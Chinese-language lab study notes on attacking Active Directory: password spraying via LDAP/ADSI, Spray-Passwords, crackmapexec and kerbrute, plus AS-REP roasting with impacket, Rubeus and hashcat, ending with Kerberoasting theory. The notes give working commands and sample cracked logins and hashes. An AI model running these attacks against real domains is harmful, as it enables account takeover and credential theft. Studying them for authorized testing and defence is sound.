# 密码攻击 
使用密码攻击之前，要知道域中帐号不能使用密码爆破技术，因为含有帐号保护机制，所以只能使用密码喷射（已知密码，尝试用户），利用很小的字典尝试密码组合 
`net accounts ` 通过net accounts命令得知该用户的密码策略
重要条目：
`Minimum password length:  7 `  最小密码长度
`Lockout threshold:   5 `  尝试错误5次锁定
`Lockout duration (minutes):   30 ` 锁定30分钟



## 使用LDAP和ADSI对用户进行密码喷射
在域环境中，使用LDAP和ADSI利用DirectoryEntry函数进行密码喷射，获取域环境中密码对应的用户名 
`$PDC=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name`
`$DN=([asdi]'').distinguishedName`
`$LDAP="LDAP://$PDC/$DN"`
`New-Object System.DirectoryServices.DirectoryEntry($LDAP,"pete","password")`
在输入用户名和密码后会返回信息
如果pete的密码正确，则会输出该用户信息：
`distinguishedName : {DC=corp,DC=com}`
输入错误密码会输出以下：
`format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or password is incorrect.`



## 使用spray-passwords脚本密码喷射
使用spray-passwords脚本对域环境中的用户进行密码喷射
`.\Spray-Passwords.ps1 -Pass abc123 -Admin`
-Pass参数代表要进行的密码喷射密码，-Admin代表也测试管理员密码
Spray-Passwords脚本或自己枚举用户，不需要输入用户名就可以进行密码喷射
最后输出：
` 'pete' with password: 'abc123'`
` 'jen' with password: 'abc123'`
如果用户密码正确就会显示



## 使用SMB进行密码喷射
传统攻击AD的密码喷射方法-使用crackmapexe工具爆破用户名，但是每次会建立完整的SMB链接，所以速度也是最慢的，而且流量也会很嘈杂 
`crackmapexec smb 10.10.10.100 -u userlist -p 'abc123' -d corp.com --continue-on-success`
**注意一点，crackmapexec不会查找帐号密码策略，一旦超过错误次数则会失败**
有时使用crackmapexec会出现 (Pwn3d!) 字样，表示该用户和密码是该机的管理员


```txt
结果：
SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.50.75   445    CLIENT75         [-] corp.com\dave:abc123 STATUS_LOGON_FAILURE 
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\jen:abc123
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\pete:abc123
```


## 使用TGT进行密码喷射
除了从正常角度对密码对应的账户进行密码喷射，来可以利用TGT协议来进行，发送AS-REQ 的udp包来进行密码尝试，而且返回也会是udp包 AS-REP，如果成功则会得到该用户的TGT票据，否则不会 
一般密码喷射作为后备方法
`.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernamelist "abc123"`
最后输出：
`2022/09/06 20:30:48 >  [+] VALID LOGIN:  jen@corp.com:abc123`  该条目表示得到用户对应的密码



# AS-REP Roasting
原理：
如果设置了**不需要keberos预认证**，则可以使用AS-REP烧烤获取域用户的密码。
如果不需要kerberos预认证则，我们可以代表任何AD用户向KDC请求TGT（包含用户密码），因为不需要传输包含由用户密码加密的时间戳，这时获取到含有TGT的AS-REP后，可以离线爆破密码
一般常见域环境中是默认开启预认证的，但是不排除个别需要关闭预认证，有些应用依赖与关闭预认证

## 使用impacket进行AS-REP Roasting攻击
首先要**确保域环境没有开放keberos预认证**，然后就可以使用工具impacket对域中任意一个主机发起AS-REP攻击，发送请求获取对应用户的TGT，从中离线破解出用户密码 
`impacket-GetNPUsers -dc-ip 192.168.100.10 -request -outputfile arproast.hash corp.com/pete`
-dc-ip 指的是KDC的地址，-request 代表请求TGT 最后包括一个用户认证corp.com/pete，最后输入密码可以得到含有TGT的AS-REP
输出结果中发现dave用户没有开启keberos预认证
`dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200`   从中就可以利用pete用户权限获得dave用户的TGT
然后使用hashcat爆破密码
`hashcat --help | grep -i "kerberos"`
`hahscat -m <code> arproasting.hash /wordlist -r /rules --force`



## 使用Rubeus攻击
Rubeus是一款利用kerberos滥用的工具集，我们可以使用该工具进行AS-REP roasting攻击 
`.\Rubeus.exe asreproast /nowrap`
asreproast 代表使用asrep roasting攻击，/nowrap 代表在输出hash时利用空行分开
最终会输出
`[*] SamAccountName         : dave`
`[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com`
`[*] AS-REP hash:`
`$krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A`
自动枚举那个用户没有开启keberos预认证，并且获取他的TGT票据，使用hashcat离线爆破



# Kerberoasting
原理：
通过AS-REQ和AS-REP，主机获得了TGT和logon session，本地利用用户密码解密logon session并缓存本地，然后利用TGT票据想KDC购买TGS服务的ST票据
接收到TGS-REQ后，KDC会验证是否正确，返回TGS-REP，其中包含对应服务SPN的NTLM hash
只要TGT正确，就都会返回ST服务票据，这也是kerberoasting能利用的原因，任何一个用户，只要hash正确，就可以请求域内任何一个服务的ST票据
